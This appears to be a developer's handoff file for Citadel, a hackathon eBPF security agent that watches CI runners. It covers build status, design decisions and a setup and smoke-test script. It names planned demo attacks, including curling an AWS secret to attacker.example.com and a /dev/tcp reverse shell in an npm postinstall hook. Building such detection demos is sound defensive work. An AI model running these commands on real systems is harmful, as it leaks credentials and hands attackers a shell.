# Citadel — Session Handoff

> **How to use this file:** Drop this file into your next Claude Code session and say "read HANDOFF.md and pick up where we left off." It captures everything needed to continue without re-explaining.

---

## TL;DR

Hackathon 2026 project — **Citadel**: runtime EDR for CI/CD runners. eBPF-based agent that watches the kernel inside a GitHub self-hosted runner and detects/blocks supply-chain attacks. The full 24-hour build plan is in `citadel-build-plan.md` at the repo root.

**Status:** Phase 0 (scaffold) ✅ done. Phase 1 (network eBPF probe) ✅ code written, ❌ not yet validated end-to-end on a real Linux kernel. Next concrete step: run `sudo make net-smoke-test` on a Linux box.

---

## What Citadel Is

A runtime security agent (think CrowdStrike for CI/CD) that sits inside a self-hosted GitHub Actions runner and uses eBPF to see every:

- **Outbound TCP connect** (kprobe `tcp_v4_connect`) — catches data exfiltration
- **Process exec** (tracepoint `sched_process_exec`) — catches reverse shells from compromised deps
- **Writeable file open** (tracepoint `sys_enter_openat` filtered to writes) — catches source-code tampering between checkout and build
- **Egress packet** (`cgroup_skb/egress`) — blocks bad destinations at the kernel level

Three demo goals = three live attacks:
1. **Prevent exfiltration** — malicious composite action curls `$AWS_SECRET_ACCESS_KEY` to `attacker.example.com`
2. **Anomaly detection** — compromised npm `postinstall` spawns `sh -i >& /dev/tcp/.../4444`
3. **Detect tampering** — step appends `// backdoor` to `src/index.js` mid-build

Architecture: `agent` (Go + eBPF) → `backend` (Go + SQLite) → `detector` (Python + FastAPI rules) → `dashboard` (Next.js 14). Plus `action/` (composite GitHub Action to wrap the agent) and `examples/` (victim CI + three attack workflows).

---

## Repo Status — What's on Disk

### Phase 0 — Scaffold (✅ complete, ✅ validated)

| File | What it is |
| :--- | :--- |
| `README.md` | Project overview + ASCII arch diagram |
| `Makefile` | Root targets: `build-agent`, `build-backend`, `build-detector`, `build-dashboard`, `docker-build`, `docker-up`, `docker-down`, `demo-reset` |
| `.gitignore` | Go / Node / Python / eBPF `.o` / SQLite |
| `docker-compose.yml` | backend:8080, detector→backend, dashboard:3000. **Agent is NOT in compose** — runs directly on the runner (needs host eBPF). |
| `agent/Dockerfile` | Multi-stage: builder (clang-14, libbpf-dev, Go 1.24) → runtime (libelf1). Comment block on required `--privileged --pid=host`. |
| `agent/Makefile` | Targets: `bpf` (clang→.o), `generate` (bpf2go), `build`, `clean`, `net-smoke-test`. Auto-detects arch (x86 vs arm64) for `-D__TARGET_ARCH_*`. |
| `agent/cmd/agent/main.go` | Entrypoint — loads NetProbe, JSON-encodes events with reverse-DNS hostname |
| `agent/go.mod` | `go 1.24.0`, requires `github.com/cilium/ebpf v0.21.0` |
| `backend/Dockerfile`, `detector/Dockerfile`, `dashboard/Dockerfile` | **Phase 0 STUBS** — minimal Python/Node http servers so compose comes up green. Replaced in Phases 5, 6, 7. |
| `examples/victim-ci.yml`, `examples/package.json`, `examples/index.js`, `examples/test.js` | Self-hosted-runner-labeled normal Node workflow + sample project |
| Per-service `README.md`s | Purpose of each directory |

### Phase 1 — Network eBPF probe (✅ code, ❌ not yet validated)

| File | What it is |
| :--- | :--- |
| `agent/bpf/net.bpf.c` | CO-RE eBPF program. kprobe on `tcp_v4_connect`. Captures pid/ppid/uid/comm/dst-IP/dst-port → 48-byte event over ringbuf (`net_events`). License GPL. Explicit `_pad` field for 8-byte alignment of `ts_ns`. |
| `agent/internal/probes/net/net.go` | `//go:build linux`. Loader using `cilium/ebpf` + `link.Kprobe` + `ringbuf.NewReader`. `//go:generate` bpf2go with `-target amd64,arm64` (path: `../../../bpf/net.bpf.c`). |
| `agent/internal/probes/net/net_stub.go` | `//go:build !linux`. Stub so Mac builds don't break — `Load()` returns "requires linux" error. |
| `agent/internal/dns/cache.go` | Reverse-DNS cache, 5-min TTL, sync.RWMutex. Synchronous `net.LookupAddr`. Documents limitation: noisy on CDN IPs; the proper fix (eBPF DNS sniffing) is scope-cut. |
| `agent/Makefile` (updated) | Added `net-smoke-test` target: builds, runs agent w/ sudo, fires two curls, asserts JSON output contains `"comm":"curl"` + github/npm/`dst_port:443`. Linux-only (guarded by `uname -s` check). |

### What hasn't been touched yet (Phases 2–10)

- Phase 2 — process probe (`proc.bpf.c`, tracepoint `sched_process_exec`)
- Phase 3 — file probe (`file.bpf.c`, tracepoint `sys_enter_openat`)
- Phase 4 — unified event schema, batching backend client, workflow-metadata enrichment, graceful shutdown
- Phase 5 — backend ingestion (Go + chi + SQLite migrations + REST endpoints)
- Phase 6 — Python detector (baseline learning + 5 detection rules)
- Phase 7 — Next.js 14 dashboard (runs list, run detail, policies)
- Phase 8 — policy engine + cgroup_skb block mode + userspace process kill
- Phase 9 — composite GitHub Action `citadel-setup` + GHCR image publish
- Phase 10 — three attack demos + polish + demo script + recording

---

## Key Technical Decisions (Non-Obvious)

1. **bpf2go target = `amd64,arm64`** (in `agent/internal/probes/net/net.go`). Originally `amd64` per build plan, switched because user has Apple Silicon. Generates separate `.o` per arch, Go build tags pick the right one.
2. **Makefile auto-detects arch** for the `-D__TARGET_ARCH_*` clang define. Maps `arm64`/`aarch64`→`arm64`, `x86_64`→`x86`.
3. **Mac compatibility preserved via stub file.** `net.go` is `//go:build linux`, `net_stub.go` is `//go:build !linux`. Both export the same `NetProbe`/`NetEvent` API. Means `make build-agent` succeeds on Mac (Go-only) but `make bpf` fails (no `vmlinux.h`, no `/sys/kernel/btf/vmlinux`). That's intentional.
4. **Go 1.24.0** in `go.mod` and Dockerfile. Originally 1.22; bumped because `cilium/ebpf v0.21.0` requires it.
5. **Struct alignment with explicit `_pad`.** `struct net_event` in C has explicit `__u16 _pad` between `dport (u16)` and `ts_ns (u64)` to avoid implicit padding. Go side mirrors with `_Pad uint16`. **Any drift in field order/size will scramble fields.**
6. **`saddr` left as 0** in the BPF program. At `tcp_v4_connect` entry the kernel hasn't bound a source address yet. Not worth a kretprobe for hackathon.
7. **`dport`/`daddr` stay in network byte order in BPF**, swapped in Go (`ntohs`, custom `ipv4FromBE32`). Verifier-cleaner than swapping in-kernel.
8. **Reverse DNS via system resolver is intentionally lossy.** Many CDN IPs won't reverse-resolve to the dialed name. Real fix would be eBPF DNS sniffing on `udp_recvmsg` — out of scope.

---

## Environment Context

- **Mac**: macOS 15.7.3 Sequoia, Apple Silicon (`arm64`). Path: `/Users/mrkete/learning/Hackathon 2026`. Git user: `Mahesh-Kete`. Used for **code editing only**.
- **Linux laptop**: separate machine the user owns. Used for **actually running and testing the agent** (eBPF requires real Linux kernel ≥ 5.15 with BTF).
- **Multipass on Mac was tried and abandoned.** Hit macOS 15 "Local Network" permission deadlock — daemon couldn't reach VM, permission prompt never fired, manual settings unhelpful. **Don't suggest Multipass again for this user.** Was uninstalled.
- **No GitHub repo pushed yet.** Will be needed for Phase 9 (composite action + self-hosted runner). Suggest creating it when the user gets to Phase 9.

---

## What To Do Next (Immediate)

Run the Phase 1 smoke test on the Linux laptop. Pre-flight first:

```sh
uname -r                       # need ≥ 5.15
uname -m                       # x86_64 or aarch64
ls /sys/kernel/btf/vmlinux     # must exist (BTF enabled)
cat /etc/os-release | head -3  # for context (distro detection)
```

If all three look good, get the code over (`git clone`, `rsync`, or USB) and run this single block in the project root (`~/citadel` or wherever):

```sh
set -e

echo "==> [1/5] Installing build dependencies (assumes Debian/Ubuntu — swap for dnf/pacman if needed)"
sudo apt-get update -qq
sudo apt-get install -y --no-install-recommends \
    build-essential clang llvm libelf-dev libbpf-dev \
    linux-headers-$(uname -r) linux-tools-generic linux-tools-common \
    make pkg-config curl git ca-certificates
sudo ln -sf $(ls /usr/lib/linux-tools/*/bpftool 2>/dev/null | head -1) /usr/local/bin/bpftool
bpftool version

echo "==> [2/5] Installing Go 1.24.0"
GOARCH=$(uname -m | sed 's/x86_64/amd64/; s/aarch64/arm64/')
cd /tmp
curl -fsSLO https://go.dev/dl/go1.24.0.linux-${GOARCH}.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.24.0.linux-${GOARCH}.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
export PATH=$PATH:/usr/local/go/bin
go version

echo "==> [3/5] Generating vmlinux.h for this kernel"
cd ~/citadel   # adjust if your path differs
sudo bpftool btf dump file /sys/kernel/btf/vmlinux format c > agent/bpf/vmlinux.h
wc -l agent/bpf/vmlinux.h   # should be tens of thousands of lines

echo "==> [4/5] Building citadel-agent"
make build-agent

echo "==> [5/5] Running net-smoke-test"
cd agent
sudo make net-smoke-test
```

**Expected output:** two JSON event lines (one per curl), each with `"comm":"curl"`, a `dst_ip`, `"dst_port":443`, and a `hostname` (possibly empty). Ends with `PASS`.

---

## If The Smoke Test Fails

Don't restart from scratch — feed the exact error back to the next Claude session. Common failure modes the build plan flags:

| Symptom | Likely Cause | Fix |
| :--- | :--- | :--- |
| `vmlinux.h: file not found` | Step 3 didn't run / wrong dir | Re-run step 3 from project root |
| BPF verifier rejection (`R1 type=...`) | `vmlinux.h` mismatched to running kernel | Re-generate `vmlinux.h` on the exact kernel |
| `failed to attach kprobe: no such file or directory` | Kernel built without ftrace/kprobes | Rare on Ubuntu; check kernel config |
| `permission denied` opening BPF | Forgot `sudo` | Re-run with `sudo` |
| PASS but `hostname:""` | Reverse DNS didn't resolve (common for CDN IPs) | Harmless — not a bug |
| `clang: not found` | Step 1 didn't install build deps | Re-run step 1 |
| `go: command not found` | Step 2 didn't update PATH in current shell | `source ~/.bashrc` or open new terminal |

---

## After Phase 1 Passes — Phase 2 Onwards

The build plan (`citadel-build-plan.md`) has phase-by-phase Claude Code prompts. Pattern that's worked:

1. Paste the prompt for the next single file/sub-phase (the prompts are file-scoped on purpose).
2. Validate before moving on.
3. When a prompt fails, feed the exact error back — don't restart.

Phase 2 (process probe) is the next ~2 hours of work. Follow the same eBPF C → Go loader → integrate-into-main pattern Phase 1 used.

---

## Files Worth Reading First In a New Session

1. `citadel-build-plan.md` — the master plan (Parts 1–5, plus appendices)
2. This file (`HANDOFF.md`) — current state
3. `agent/bpf/net.bpf.c` — the working eBPF program (reference for Phase 2, 3, 4)
4. `agent/internal/probes/net/net.go` — the Go loader pattern (reference for Phase 2, 3)
5. `agent/cmd/agent/main.go` — current entrypoint (will be extended by every later phase)

---

_Last updated: end of Phase 1 implementation, before validation. User is migrating to a separate Linux laptop for eBPF testing._
